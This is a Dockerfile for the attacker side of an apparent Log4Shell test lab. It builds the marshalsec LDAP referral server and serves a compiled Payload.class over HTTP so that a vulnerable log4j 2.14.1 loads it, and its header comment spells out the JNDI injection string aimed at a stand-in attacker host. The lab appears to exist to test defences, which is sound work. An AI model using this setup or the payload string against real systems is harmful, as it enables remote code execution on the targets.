# Attacker-side container — runs marshalsec LDAP referral server +
# serves the compiled Payload.class over HTTP on port 8888.
# The JNDI URL embedded in the attacker's payload is:
#   ${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}
# log4j 2.14.1 follows the LDAP referral to the HTTP URL and loads the class.

FROM maven:3.9-eclipse-temurin-11@sha256:5818ee89bddd09cc7b265bea1919c5088f82a4e17f0adc104e12e94cb26bea03 AS build
WORKDIR /src
# Build marshalsec from upstream.
RUN apt-get update && apt-get install -y --no-install-recommends git && \
    git clone --depth 1 https://github.com/mbechler/marshalsec.git && \
    cd marshalsec && mvn -B clean package -DskipTests

# Compile Payload.class with target=1.8 so the vulnerable JDK 11 can load it.
COPY Payload.java /src/Payload.java
RUN javac -source 1.8 -target 1.8 /src/Payload.java -d /src/classes

FROM eclipse-temurin:11-jdk@sha256:4d14042fcb8451c643170f8d7f556b817a7aa65800c582ad9190dbc60d424886
WORKDIR /attacker
# python3 needed by run.sh to serve Payload.class on :8888 (the eclipse-temurin
# base image ships with no python). Without this the HTTP server never starts,
# log4j gets a referral to a dead port, and every scenario looks "stage-2-blocked".
RUN apt-get update && apt-get install -y --no-install-recommends python3 && \
    rm -rf /var/lib/apt/lists/*
COPY --from=build /src/marshalsec/target/marshalsec-*-all.jar /attacker/marshalsec.jar
COPY --from=build /src/classes/Payload.class /attacker/www/Payload.class

# Two services in one container, supervised by a tiny shell wrapper.
COPY run.sh /attacker/run.sh
RUN chmod +x /attacker/run.sh

EXPOSE 1389 8888
ENTRYPOINT ["/attacker/run.sh"]
